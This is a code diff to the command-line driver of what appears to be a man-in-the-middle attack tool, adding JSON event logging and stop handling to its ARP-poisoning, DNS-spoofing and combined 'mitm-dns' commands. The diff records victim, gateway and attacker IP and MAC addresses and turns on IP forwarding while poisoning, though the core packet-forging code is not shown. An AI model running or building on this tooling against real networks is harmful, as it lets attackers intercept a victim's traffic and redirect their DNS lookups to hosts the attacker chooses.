@@ -2,6 +2,7 @@
 from __future__ import annotations
 
 import argparse
+from datetime import datetime, timezone
 import json
 import os
 from pathlib import Path
@@ -68,7 +69,15 @@ def parse_args() -> argparse.Namespace:
 
 
 def print_json(payload) -> None:
-    print(json.dumps(payload, indent=2, sort_keys=True))
+    print(json.dumps(payload, sort_keys=True), flush=True)
+
+
+def utc_now() -> str:
+    return datetime.now(timezone.utc).isoformat()
+
+
+def event_payload(event_type: str, **payload) -> dict:
+    return {"ts": utc_now(), "event": event_type, **payload}
 
 
 def install_stop_signal_handlers(stop_event: threading.Event) -> None:
@@ -115,20 +124,56 @@ def main() -> int:
         return 0
 
     if args.command == "arp-poison":
+        stop_event = threading.Event()
+        install_stop_signal_handlers(stop_event)
         poisoner = runner.build_arp_poisoner(
             victim_ip=args.victim_ip,
             gateway_ip=args.gateway_ip,
             interval=args.interval,
         )
-        poisoner.resolve_endpoints()
+        endpoints = poisoner.resolve_endpoints()
         changed_forwarding = False
         try:
             if args.enable_forwarding and not ipv4_forwarding_enabled():
                 set_ipv4_forwarding(True)
                 changed_forwarding = True
-            poisoner.run(cycles=args.cycles)
+            print_json(
+                event_payload(
+                    "arp_poison_started",
+                    interface=args.interface,
+                    interval=args.interval,
+                    victim_ip=endpoints.victim_ip,
+                    gateway_ip=endpoints.gateway_ip,
+                    victim_mac=endpoints.victim_mac,
+                    gateway_mac=endpoints.gateway_mac,
+                    attacker_mac=endpoints.attacker_mac,
+                )
+            )
+            poisoner.run(
+                cycles=args.cycles,
+                stop_requested=stop_event.is_set,
+                on_cycle=lambda cycle, resolved_endpoints: print_json(
+                    event_payload(
+                        "arp_poison_cycle",
+                        cycle=cycle,
+                        victim_ip=resolved_endpoints.victim_ip,
+                        gateway_ip=resolved_endpoints.gateway_ip,
+                        victim_mac=resolved_endpoints.victim_mac,
+                        gateway_mac=resolved_endpoints.gateway_mac,
+                        attacker_mac=resolved_endpoints.attacker_mac,
+                    )
+                ),
+            )
         finally:
             poisoner.restore()
+            print_json(
+                event_payload(
+                    "arp_poison_restored",
+                    interface=args.interface,
+                    victim_ip=endpoints.victim_ip,
+                    gateway_ip=endpoints.gateway_ip,
+                )
+            )
             if changed_forwarding:
                 set_ipv4_forwarding(False)
         return 0
@@ -141,11 +186,29 @@ def main() -> int:
             domains=args.domains,
             victim_ip=args.victim_ip,
         )
+        print_json(
+            event_payload(
+                "dns_spoof_started",
+                interface=args.interface,
+                victim_ip=spoofer.victim_ip,
+                attacker_ip=spoofer.attacker_ip,
+                gateway_ip=spoofer.gateway_ip,
+                records=spoofer.records,
+            )
+        )
         spoofer.run(
             packet_count=args.packet_count,
-            on_spoof=lambda event: print_json(event.__dict__),
+            on_spoof=lambda event: print_json(
+                event_payload(
+                    "dns_spoof",
+                    client_ip=event.client_ip,
+                    query_name=event.query_name,
+                    answer_ip=event.answer_ip,
+                )
+            ),
             stop_requested=stop_event.is_set,
         )
+        print_json(event_payload("dns_spoof_stopped", interface=args.interface))
         return 0
 
     if args.command == "mitm-dns":
@@ -156,7 +219,7 @@ def main() -> int:
             gateway_ip=args.gateway_ip,
             interval=args.interval,
         )
-        poisoner.resolve_endpoints()
+        endpoints = poisoner.resolve_endpoints()
         spoofer = runner.build_dns_spoofer(
             answer_ip=args.answer_ip,
             domains=args.domains,
@@ -165,7 +228,20 @@ def main() -> int:
 
         poison_thread = threading.Thread(
             target=poisoner.run,
-            kwargs={"stop_requested": stop_event.is_set},
+            kwargs={
+                "stop_requested": stop_event.is_set,
+                "on_cycle": lambda cycle, resolved_endpoints: print_json(
+                    event_payload(
+                        "arp_poison_cycle",
+                        cycle=cycle,
+                        victim_ip=resolved_endpoints.victim_ip,
+                        gateway_ip=resolved_endpoints.gateway_ip,
+                        victim_mac=resolved_endpoints.victim_mac,
+                        gateway_mac=resolved_endpoints.gateway_mac,
+                        attacker_mac=resolved_endpoints.attacker_mac,
+                    )
+                ),
+            },
             daemon=True,
         )
 
@@ -174,15 +250,43 @@ def main() -> int:
             if args.enable_forwarding and not ipv4_forwarding_enabled():
                 set_ipv4_forwarding(True)
                 changed_forwarding = True
+            print_json(
+                event_payload(
+                    "mitm_dns_started",
+                    interface=args.interface,
+                    interval=args.interval,
+                    victim_ip=endpoints.victim_ip,
+                    gateway_ip=endpoints.gateway_ip,
+                    victim_mac=endpoints.victim_mac,
+                    gateway_mac=endpoints.gateway_mac,
+                    attacker_mac=endpoints.attacker_mac,
+                    dns_records=spoofer.records,
+                )
+            )
             poison_thread.start()
             spoofer.run(
-                on_spoof=lambda event: print_json(event.__dict__),
+                on_spoof=lambda event: print_json(
+                    event_payload(
+                        "dns_spoof",
+                        client_ip=event.client_ip,
+                        query_name=event.query_name,
+                        answer_ip=event.answer_ip,
+                    )
+                ),
                 stop_requested=stop_event.is_set,
             )
         finally:
             stop_event.set()
             poison_thread.join(timeout=2)
             poisoner.restore()
+            print_json(
+                event_payload(
+                    "mitm_dns_stopped",
+                    interface=args.interface,
+                    victim_ip=endpoints.victim_ip,
+                    gateway_ip=endpoints.gateway_ip,
+                )
+            )
             if changed_forwarding:
                 set_ipv4_forwarding(False)
         return 0
